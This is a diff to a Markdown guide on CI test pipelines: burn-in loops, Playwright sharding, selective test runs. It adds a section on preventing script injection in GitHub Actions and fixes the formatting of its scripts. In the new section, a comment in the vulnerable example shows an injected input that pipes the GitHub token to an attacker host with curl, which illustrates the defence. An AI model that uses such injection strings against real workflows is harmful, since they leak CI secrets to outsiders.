@@ -8,18 +8,58 @@ CI pipelines must execute tests reliably, quickly, and provide clear feedback. B
 
 CI is the quality gate for production. A poorly configured pipeline either wastes developer time (slow feedback, false positives) or ships broken code (false negatives, insufficient coverage). Burn-in testing ensures reliability by stress-testing changed code, while parallel execution and intelligent test selection optimize speed without sacrificing thoroughness.
 
+## Security: Script Injection Prevention
+
+**Rule:** NEVER use `${{ inputs.* }}` or user-controlled GitHub context directly in `run:` blocks. Always pass through `env:` and reference as `"$ENV_VAR"` (double-quoted).
+
+When CI templates are extended into reusable workflows (`on: workflow_call`), manual dispatch workflows (`on: workflow_dispatch`), or composite actions, `${{ inputs.* }}` values become user-controllable. Interpolating them directly in `run:` blocks enables shell command injection.
+
+### Vulnerable vs Safe Pattern
+
+```yaml
+# ❌ VULNERABLE — inputs.test_ids could contain: "; curl attacker.com/steal?t=$(cat $GITHUB_TOKEN)"
+- name: Run tests
+  run: |
+    npx playwright test --grep "${{ inputs.test_ids }}"
+
+# ✅ SAFE — env var cannot break out of shell quoting
+- name: Run tests
+  env:
+    TEST_IDS: ${{ inputs.test_ids }}
+  run: |
+    npx playwright test --grep "$TEST_IDS"
+```
+
+### Unsafe Contexts (require env: intermediary)
+
+- `${{ inputs.* }}` — workflow_call and workflow_dispatch inputs
+- `${{ github.event.* }}` — treat the entire event namespace as unsafe (PR titles, issue bodies, comment bodies, label names, etc.)
+- `${{ github.head_ref }}` — PR source branch name (user-controlled)
+
+**Important:** Passing through `env:` prevents GitHub expression injection, but inputs must still be treated as DATA, not COMMANDS. Never execute an input-derived env var as a shell command (e.g., `run: $CMD` where CMD came from an input). Use fixed commands and pass inputs only as quoted arguments.
+
+### Safe Contexts (safe from GitHub expression injection in run: blocks)
+
+- `${{ steps.*.outputs.* }}` — pre-computed by your own code
+- `${{ matrix.* }}` — defined in workflow YAML
+- `${{ runner.os }}`, `${{ github.sha }}`, `${{ github.ref }}` — system-controlled
+- `${{ secrets.* }}` — secret store, not user-injectable
+- `${{ env.* }}` — already an env var
+
+> **Note:** "Safe from expression injection" means these values cannot be manipulated by external actors to break out of `${{ }}` interpolation. Standard shell quoting practices still apply — always double-quote variable references in `run:` blocks.
+
+---
+
 ## Pattern Examples
 
 ### Example 1: GitHub Actions Workflow with Parallel Execution
 
-- *Context**: Production-ready CI/CD pipeline for E2E tests with caching, parallelization, and burn-in testing.
+**Context**: Production-ready CI/CD pipeline for E2E tests with caching, parallelization, and burn-in testing.
 
-- *Implementation**:
+**Implementation**:
 
 ```yaml
-
 # .github/workflows/e2e-tests.yml
-
 name: E2E Tests
 on:
   pull_request:
@@ -36,41 +76,33 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-
       - name: Checkout code
-
         uses: actions/checkout@v4
 
       - name: Setup Node.js
-
         uses: actions/setup-node@v4
         with:
           node-version-file: ${{ env.NODE_VERSION_FILE }}
           cache: 'npm'
 
       - name: Cache node modules
-
         uses: actions/cache@v4
         id: npm-cache
         with:
           path: |
-
             ~/.npm
             node_modules
             ~/.cache/Cypress
             ~/.cache/ms-playwright
           key: ${{ env.CACHE_KEY }}
           restore-keys: |
-
             ${{ runner.os }}-node-
 
       - name: Install dependencies
-
         if: steps.npm-cache.outputs.cache-hit != 'true'
         run: npm ci --prefer-offline --no-audit
 
       - name: Install Playwright browsers
-
         if: steps.npm-cache.outputs.cache-hit != 'true'
         run: npx playwright install --with-deps chromium
 
@@ -80,52 +112,41 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 15
     steps:
-
       - name: Checkout code
-
         uses: actions/checkout@v4
         with:
           fetch-depth: 0 # Full history for accurate diff
 
       - name: Setup Node.js
-
         uses: actions/setup-node@v4
         with:
           node-version-file: ${{ env.NODE_VERSION_FILE }}
           cache: 'npm'
 
       - name: Restore dependencies
-
         uses: actions/cache@v4
         with:
           path: |
-
             ~/.npm
             node_modules
             ~/.cache/ms-playwright
           key: ${{ env.CACHE_KEY }}
 
       - name: Detect changed test files
-
         id: changed-tests
         run: |
-
           CHANGED_SPECS=$(git diff --name-only origin/main...HEAD | grep -E '\.(spec|test)\.(ts|js|tsx|jsx)$' || echo "")
-
           echo "changed_specs=${CHANGED_SPECS}" >> $GITHUB_OUTPUT
           echo "Changed specs: ${CHANGED_SPECS}"
 
       - name: Run burn-in on changed specs (10 iterations)
-
         if: steps.changed-tests.outputs.changed_specs != ''
         run: |
-
           SPECS="${{ steps.changed-tests.outputs.changed_specs }}"
           echo "Running burn-in: 10 iterations on changed specs"
           for i in {1..10}; do
             echo "Burn-in iteration $i/10"
             npm run test -- $SPECS || {
-
               echo "❌ Burn-in failed on iteration $i"
               exit 1
             }
@@ -133,13 +154,11 @@ jobs:
           echo "✅ Burn-in passed - 10/10 successful runs"
 
       - name: Upload artifacts on failure
-
         if: failure()
         uses: actions/upload-artifact@v4
         with:
           name: burn-in-failure-artifacts
           path: |
-
             test-results/
             playwright-report/
             screenshots/
@@ -155,50 +174,41 @@ jobs:
       matrix:
         shard: [1, 2, 3, 4]
     steps:
-
       - name: Checkout code
-
         uses: actions/checkout@v4
 
       - name: Setup Node.js
-
         uses: actions/setup-node@v4
         with:
           node-version-file: ${{ env.NODE_VERSION_FILE }}
           cache: 'npm'
 
       - name: Restore dependencies
-
         uses: actions/cache@v4
         with:
           path: |
-
             ~/.npm
             node_modules
             ~/.cache/ms-playwright
           key: ${{ env.CACHE_KEY }}
 
       - name: Run E2E tests (shard ${{ matrix.shard }})
-
         run: npm run test:e2e -- --shard=${{ matrix.shard }}/4
         env:
           TEST_ENV: staging
           CI: true
 
       - name: Upload test results
-
         if: always()
         uses: actions/upload-artifact@v4
         with:
           name: test-results-shard-${{ matrix.shard }}
           path: |
-
             test-results/
             playwright-report/
           retention-days: 30
 
       - name: Upload JUnit report
-
         if: always()
         uses: actions/upload-artifact@v4
         with:
@@ -212,23 +222,18 @@ jobs:
     runs-on: ubuntu-latest
     if: always()
     steps:
-
       - name: Download all shard results
-
         uses: actions/download-artifact@v4
         with:
           pattern: test-results-shard-*
           path: all-results/
 
       - name: Merge HTML reports
-
         run: |
-
           npx playwright merge-reports --reporter=html all-results/
           echo "Merged report available in playwright-report/"
 
       - name: Upload merged report
-
         uses: actions/upload-artifact@v4
         with:
           name: merged-playwright-report
@@ -236,15 +241,13 @@ jobs:
           retention-days: 30
 
       - name: Comment PR with results
-
         if: github.event_name == 'pull_request'
         uses: daun/playwright-report-comment@v3
         with:
           report-path: playwright-report/
+```
 
-```bash
-
-- *Key Points**:
+**Key Points**:
 
 - **Install once, reuse everywhere**: Dependencies cached across all jobs
 - **Burn-in first**: Changed specs run 10x before full suite
@@ -252,26 +255,22 @@ jobs:
 - **Parallel execution**: 4 shards cut execution time by ~75%
 - **Artifact retention**: 30 days for reports, 7 days for failure debugging
 
-- --
+---
 
 ### Example 2: Burn-In Loop Pattern (Standalone Script)
 
-- *Context**: Reusable bash script for burn-in testing changed specs locally or in CI.
+**Context**: Reusable bash script for burn-in testing changed specs locally or in CI.
 
-- *Implementation**:
+**Implementation**:
 
 ```bash
-
-# !/bin/bash
-
+#!/bin/bash
 # scripts/burn-in-changed.sh
-
 # Usage: ./scripts/burn-in-changed.sh [iterations] [base-branch]
 
 set -e  # Exit on error
 
 # Configuration
-
 ITERATIONS=${1:-10}
 BASE_BRANCH=${2:-main}
 SPEC_PATTERN='\.(spec|test)\.(ts|js|tsx|jsx)$'
@@ -283,47 +282,40 @@ echo "Base branch: $BASE_BRANCH"
 echo ""
 
 # Detect changed test files
-
 echo "📋 Detecting changed test files..."
 CHANGED_SPECS=$(git diff --name-only $BASE_BRANCH...HEAD | grep -E "$SPEC_PATTERN" || echo "")
 
-if [-z "$CHANGED_SPECS"]; then
+if [ -z "$CHANGED_SPECS" ]; then
   echo "✅ No test files changed. Skipping burn-in."
   exit 0
 fi
 
 echo "Changed test files:"
 echo "$CHANGED_SPECS" | sed 's/^/  - /'
-
 echo ""
 
 # Count specs
-
 SPEC_COUNT=$(echo "$CHANGED_SPECS" | wc -l | xargs)
-
 echo "Running burn-in on $SPEC_COUNT test file(s)..."
 echo ""
 
 # Burn-in loop
-
 FAILURES=()
 for i in $(seq 1 $ITERATIONS); do
   echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
   echo "🔄 Iteration $i/$ITERATIONS"
   echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
-# Run tests with explicit file list
+  # Run tests with explicit file list
   if npm run test -- $CHANGED_SPECS 2>&1 | tee "burn-in-log-$i.txt"; then
-
     echo "✅ Iteration $i passed"
   else
     echo "❌ Iteration $i failed"
     FAILURES+=($i)
 
-# Save failure artifacts
+    # Save failure artifacts
     mkdir -p burn-in-failures/iteration-$i
     cp -r test-results/ burn-in-failures/iteration-$i/ 2>/dev/null || true
-
     cp -r screenshots/ burn-in-failures/iteration-$i/ 2>/dev/null || true
 
     echo ""
@@ -338,7 +330,6 @@ for i in $(seq 1 $ITERATIONS); do
 done
 
 # Success summary
-
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "🎉 BURN-IN PASSED"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
@@ -347,37 +338,30 @@ echo "Changed specs are stable and ready to merge."
 echo ""
 
 # Cleanup logs
-
 rm -f burn-in-log-*.txt
 
 exit 0
+```
+
+**Usage**:
 
 ```bash
-
-- *Usage**:
-
-```bash
-
 # Run locally with default settings (10 iterations, compare to main)
-
 ./scripts/burn-in-changed.sh
 
 # Custom iterations and base branch
-
 ./scripts/burn-in-changed.sh 20 develop
 
 # Add to package.json
-
 {
   "scripts": {
     "test:burn-in": "bash scripts/burn-in-changed.sh",
     "test:burn-in:strict": "bash scripts/burn-in-changed.sh 20"
   }
 }
+```
 
-```bash
-
-- *Key Points**:
+**Key Points**:
 
 - **Exit on first failure**: Flaky tests caught immediately
 - **Failure artifacts**: Saved per-iteration for debugging
@@ -385,13 +369,13 @@ exit 0
 - **CI/local parity**: Same script runs in both environments
 - **Clear output**: Visual feedback on progress and results
 
-- --
+---
 
 ### Example 3: Shard Orchestration with Result Aggregation
 
-- *Context**: Advanced sharding strategy for large test suites with intelligent result merging.
+**Context**: Advanced sharding strategy for large test suites with intelligent result merging.
 
-- *Implementation**:
+**Implementation**:
 
 ```javascript
 // scripts/run-sharded-tests.js
@@ -400,15 +384,12 @@ const fs = require('fs');
 const path = require('path');
 
 /**
-
- - Run tests across multiple shards and aggregate results
- - Usage: node scripts/run-sharded-tests.js --shards=4 --env=staging
- - /
+ * Run tests across multiple shards and aggregate results
+ * Usage: node scripts/run-sharded-tests.js --shards=4 --env=staging
+ */
 
 const SHARD_COUNT = parseInt(process.env.SHARD_COUNT || '4');
-
 const TEST_ENV = process.env.TEST_ENV || 'local';
-
 const RESULTS_DIR = path.join(__dirname, '../test-results');
 
 console.log(`🚀 Running tests across ${SHARD_COUNT} shards`);
@@ -421,10 +402,8 @@ if (!fs.existsSync(RESULTS_DIR)) {
 }
 
 /**
-
- - Run a single shard
- - /
-
+ * Run a single shard
+ */
 function runShard(shardIndex) {
   return new Promise((resolve, reject) => {
     const shardId = `${shardIndex}/${SHARD_COUNT}`;
@@ -470,10 +449,8 @@ function runShard(shardIndex) {
 }
 
 /**
-
- - Aggregate results from all shards
- - /
-
+ * Aggregate results from all shards
+ */
 function aggregateResults() {
   console.log('\n📊 Aggregating results from all shards...');
 
@@ -492,15 +469,10 @@ function aggregateResults() {
 
       // Aggregate stats
       totalTests += result.stats?.expected || 0;
-
       totalPassed += result.stats?.expected || 0;
-
       totalFailed += result.stats?.unexpected || 0;
-
       totalSkipped += result.stats?.skipped || 0;
-
       totalFlaky += result.stats?.flaky || 0;
-
     }
   }
 
@@ -513,7 +485,6 @@ function aggregateResults() {
     skipped: totalSkipped,
     flaky: totalFlaky,
     duration: shardResults.reduce((acc, r) => acc + (r.duration || 0), 0),
-
     timestamp: new Date().toISOString(),
   };
 
@@ -535,10 +506,8 @@ function aggregateResults() {
 }
 
 /**
-
- - Main execution
- - /
-
+ * Main execution
+ */
 async function main() {
   const startTime = Date.now();
   const shardPromises = [];
@@ -574,10 +543,9 @@ main().catch((error) => {
   console.error('Fatal error:', error);
   process.exit(1);
 });
+```
 
-```bash
-
-- *package.json integration**:
+**package.json integration**:
 
 ```json
 {
@@ -586,10 +554,9 @@ main().catch((error) => {
     "test:sharded:ci": "SHARD_COUNT=8 TEST_ENV=staging node scripts/run-sharded-tests.js"
   }
 }
+```
 
-```bash
-
-- *Key Points**:
+**Key Points**:
 
 - **Parallel shard execution**: All shards run simultaneously
 - **Result aggregation**: Unified summary across shards
@@ -597,20 +564,17 @@ main().catch((error) => {
 - **Artifact preservation**: Individual shard results saved for debugging
 - **CI/local compatibility**: Same script works in both environments
 
-- --
+---
 
 ### Example 4: Selective Test Execution (Changed Files + Tags)
 
-- *Context**: Optimize CI by running only relevant tests based on file changes and tags.
+**Context**: Optimize CI by running only relevant tests based on file changes and tags.
 
-- *Implementation**:
+**Implementation**:
 
 ```bash
-
-# !/bin/bash
-
+#!/bin/bash
 # scripts/selective-test-runner.sh
-
 # Intelligent test selection based on changed files and test tags
 
 set -e
@@ -625,67 +589,51 @@ echo "Environment: $TEST_ENV"
 echo ""
 
 # Detect changed files (all types, not just tests)
-
 CHANGED_FILES=$(git diff --name-only $BASE_BRANCH...HEAD)
 
-if [-z "$CHANGED_FILES"]; then
+if [ -z "$CHANGED_FILES" ]; then
   echo "✅ No files changed. Skipping tests."
   exit 0
 fi
 
 echo "Changed files:"
 echo "$CHANGED_FILES" | sed 's/^/  - /'
-
 echo ""
 
 # Determine test strategy based on changes
-
 run_smoke_only=false
 run_all_tests=false
 affected_specs=""
 
 # Critical files = run all tests
-
 if echo "$CHANGED_FILES" | grep -qE '(package\.json|package-lock\.json|playwright\.config|cypress\.config|\.github/workflows)'; then
-
   echo "⚠️  Critical configuration files changed. Running ALL tests."
   run_all_tests=true
 
 # Auth/security changes = run all auth + smoke tests
-
 elif echo "$CHANGED_FILES" | grep -qE '(auth|login|signup|security)'; then
-
   echo "🔒 Auth/security files changed. Running auth + smoke tests."
   npm run test -- --grep "@auth|@smoke"
-
   exit $?
 
 # API changes = run integration + smoke tests
-
 elif echo "$CHANGED_FILES" | grep -qE '(api|service|controller)'; then
-
   echo "🔌 API files changed. Running integration + smoke tests."
   npm run test -- --grep "@integration|@smoke"
-
   exit $?
 
 # UI component changes = run related component tests
-
 elif echo "$CHANGED_FILES" | grep -qE '\.(tsx|jsx|vue)$'; then
-
   echo "🎨 UI components changed. Running component + smoke tests."
 
-# Extract component names and find related tests
+  # Extract component names and find related tests
   components=$(echo "$CHANGED_FILES" | grep -E '\.(tsx|jsx|vue)$' | xargs -I {} basename {} | sed 's/\.[^.]*$//')
-
   for component in $components; do
-
-# Find tests matching component name
+    # Find tests matching component name
     affected_specs+=$(find tests -name "*${component}*" -type f) || true
-
   done
 
-  if [-n "$affected_specs"]; then
+  if [ -n "$affected_specs" ]; then
     echo "Running tests for: $affected_specs"
     npm run test -- $affected_specs --grep "@smoke"
   else
@@ -695,9 +643,7 @@ elif echo "$CHANGED_FILES" | grep -qE '\.(tsx|jsx|vue)$'; then
   exit $?
 
 # Documentation/config only = run smoke tests
-
 elif echo "$CHANGED_FILES" | grep -qE '\.(md|txt|json|yml|yaml)$'; then
-
   echo "📝 Documentation/config files changed. Running smoke tests only."
   run_smoke_only=true
 else
@@ -706,25 +652,21 @@ else
 fi
 
 # Execute selected strategy
-
-if ["$run_all_tests" = true]; then
+if [ "$run_all_tests" = true ]; then
   echo ""
   echo "Running full test suite..."
   npm run test
-elif ["$run_smoke_only" = true]; then
+elif [ "$run_smoke_only" = true ]; then
   echo ""
   echo "Running smoke tests..."
   npm run test -- --grep "@smoke"
 fi
+```
 
-```bash
-
-- *Usage in GitHub Actions**:
+**Usage in GitHub Actions**:
 
 ```yaml
-
 # .github/workflows/selective-tests.yml
-
 name: Selective Tests
 on: pull_request
 
@@ -732,22 +674,18 @@ jobs:
   selective-tests:
     runs-on: ubuntu-latest
     steps:
-
       - uses: actions/checkout@v4
-
         with:
           fetch-depth: 0
 
       - name: Run selective tests
-
         run: bash scripts/selective-test-runner.sh
         env:
           BASE_BRANCH: ${{ github.base_ref }}
           TEST_ENV: staging
+```
 
-```bash
-
-- *Key Points**:
+**Key Points**:
 
 - **Intelligent routing**: Tests selected based on changed file types
 - **Tag-based filtering**: Use @smoke, @auth, @integration tags
@@ -755,7 +693,7 @@ jobs:
 - **Safety net**: Critical changes trigger full suite
 - **Component mapping**: UI changes run related component tests
 
-- --
+---
 
 ## CI Configuration Checklist
 
